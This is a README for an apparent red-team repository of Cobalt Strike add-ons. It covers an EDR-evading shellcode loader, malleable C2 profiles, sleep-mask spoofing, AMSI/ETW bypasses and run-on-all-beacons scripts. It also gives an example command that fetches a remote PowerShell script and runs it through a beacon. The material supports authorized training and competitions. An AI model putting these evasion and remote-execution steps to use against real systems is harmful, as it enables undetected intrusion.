# Cobalt Strike Resources
Various resources to enhance Cobalt Strike's functionality and its ability to evade antivirus/EDR detection. Includes the custom tooling I used when pursuing the Certified Red Team Lead (CRTL) certification.

For my Red Team Ops I and II cheat sheets, check out my [cheat sheets repo](https://github.com/RedefiningReality/Cheatsheets).

### Contents
#### Loader
- [loader](loader/) ⇒ used to bypass Windows Defender and Elastic EDR detections to run Cobalt Strike beacon shellcode `<protocol>_x64.xprocess.bin`
  - uses NtMapViewOfSection technique for shellcode injection
  - spawns and injects into msedge.exe by default, though you could easily change this
#### Profile
- [crtl.profile](profile/crtl.profile) ⇒ malleable C2 profile used on CRTL exam, based on [webbug.profile](https://github.com/Cobalt-Strike/Malleable-C2-Profiles/blob/master/normal/webbug.profile)
- [mwccdc.profile](profile/mwccdc.profile) ⇒ malleable C2 profile used for MWCCDC regionals in 2024, based on [microsoftupdate_getonly.profile](https://github.com/Cobalt-Strike/Malleable-C2-Profiles/blob/master/normal/microsoftupdate_getonly.profile)
#### Kits
- [sleepmask](kits/sleepmask/) ⇒ Cobalt Strike sleep mask kit modifications to spoof legitimate msedge.exe thread callstack
- [process_inject](kits/process_inject/) ⇒ Cobalt Strike process injection kit modifications that implement NtMapViewOfSection technique - not necessary since this option is available in the malleable C2 profile, but it's a good example of how to use kernel32.dll and ntdll.dll Windows API function calls to create your own injection. I found concrete examples of this to be severely lacking on the internet.
#### Post-Ex
- [powerpick.cs](post-ex/powerpick.cs) ⇒ C# code for running unmanaged PowerShell, providing the PowerShell command as an argument(s) - compatible with inline-x.cna
- [inline-x.cna](post-ex/inline-x.cna) ⇒ modified [inlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) cna file that makes running .NET assemblies and PowerShell inline easier
- [command-all.cna](post-ex/command-all.cna) ⇒ execute `run` or `shell` command on *all* active Cobalt Strike beacons, without having to interact with each one individually

**Note:** When building powerpick.cs, you'll have to add a reference to **System.Management.Automation.dll**, which is located in `C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\<version>`

### Loader Usage
#### Two executable types:
1. EXE ⇒ standard Windows executable
2. Service ⇒ Windows service executable

**Note:** [beaconsvc.cpp](loader/main/beaconsvc.cpp) gets caught by Elastic static detection when compiled, so you might have to modify it. You can also run the standard EXE as a service, and it'll throw an error but still spawn the beacon.
#### Three loader variants:
1. Download Stager ⇒ download shellcode from file hosted on Cobalt Strike team server over HTTPS
2. Read Stager ⇒ read shellcode from disk, by default C:\Windows\beacon.bin but you can change this
3. Stageless ⇒ include shellcode directly in PE as a resource (in .rsrc section) - requires encoding the shellcode so it's not caught by EDR
#### Building the loader
1. (stageless only) generate encoded Cobalt Strike shellcode file with [encoder.py](loader/helpers/encoder.py) - see comments for more info
2. open [.sln](loader/loader.sln) file in [Visual Studio](https://visualstudio.microsoft.com/free-developer-offers/)
3. (stageless only) follow instructions in [encoder.py](loader/helpers/encoder.py) to include encoded shellcode file as a resource
4. select your desired build
5. Build Solution

### Inline X Usage
1. Change `$powerpickPath` to specify the path of your unmanaged PowerShell exe (built from [powerpick.cs](post-ex/powerpick.cs))
2. Change `$etw` and `$amsi` as you see fit - I wanted it to always bypass AMSI and ETW, which is why I set these values to 1, though someone could argue this creates additional telemetry in cases where the AMSI/ETW bypass isn't necessary, and for this reason it's better to leave the default values at 0.
3. [Load script](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_cs-scripting.htm) into Cobalt Strike
4. Execute .NET assembly inline with `x execute-assembly <exe> <args>`
5. Execute unmanaged PowerShell inline with `x powerpick <powershell>`
   - I made this compatible with `powershell-import`, but I noticed that using this method of importing scripts generally gets detected by EDR. If you'd like to remove this functionality altogether, comment/remove lines 74-76.
   - As an alternative, use `--import <script>` (eg. `x --import https://example.com/PowerView.ps1 powerpick Get-Domain`). You can specify a local file on disk or remotely hosted file with http/https. This only supports importing *one* PowerShell script. I'm too lazy to extend the functionality to support multiple scripts when one per command is usually all you need.

**Note:** I commented out the portions of the script that parse arguments in single (') and double quotes (") as a single argument because most of my tooling handles or requires these quotes. For example, the unmanaged PowerShell implementation [powerpick.cs](post-ex/powerpick.cs) takes arguments passed in, converts them to one string, and runs that string. Treating multiple words as a single argument in PowerShell commands thus requires passing in those quotes as-is. You may run into instances where you *do* need to parse arguments in quotes as a single argument, much like you would providing quotes when running the .NET executable in a terminal. If this is the case, you are welcome to uncomment the code portions starting on line 87 and reload the script. In case you decide to do this, I modified the conditional (if statement) so it continues to pass quotes in as-is when running powerpick.

### Command All Usage
1. [Load script](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_cs-scripting.htm) into Cobalt Strike
2. Open Script Console
3. Execute `run` on all active beacons with `run_all <exe> <args>`
4. Execute `shell` on all active beacons with `shell_all <command>`

### Credit
My experience with AV/EDR evasion techniques and Cobalt Strike comes from the following:
- [Zero-Point Security Red Team Ops II](https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii)
- [Maldev Academy](https://maldevacademy.com)
- [Midwest Regional Collegiate Cyber Defense Competition](https://www.cssia.org/mwccdc/) (I'm a red team volunteer)

I also recommend checking out the [Sektor7 Institute](https://institute.sektor7.net) courses.

Two additional Beacon Object Files I found very useful that I wanted to give a shoutout to, both by [TrustedSec](https://trustedsec.com):
- [Situational Awareness](https://github.com/trustedsec/CS-Situational-Awareness-BOF)
- [Remote Operations](https://github.com/trustedsec/CS-Remote-OPs-BOF)

### Copyright Disclaimer
I was careful to avoid any copyright infringement with the resources I publicly provided in this repo. Here are two areas where copyright might come into question:
1. I include my modifications to the Cobalt Strike process injection and sleep mask kits from Fortra, which are closed-source. However, I only provided files to which I made modifications, and I replaced all portions of the code that were not my own with a comment stating *redacted*. Should you choose to use these resources, you'll have to copy my code portions over from this repo to the corresponding files in the kits.
2. In my loader, I included code taken directly from the Zero-Point Security Red Team Ops II course. However, this code is publicly available and easily-obtainable online as well. Telling ChatGPT to "write C++ code using WinHTTP to download a file and save it to an std::vector\<BYTE\>" yields almost the exact same code for the Download function, and the NtMapViewOfSection technique is [publicly documented](https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection) in various locations, making use of the same Windows API function calls in the same order. Also keep in mind this repo doesn't come close to being a substitute for [the course](https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii) itself, which in my opinion is absolutely worth taking.
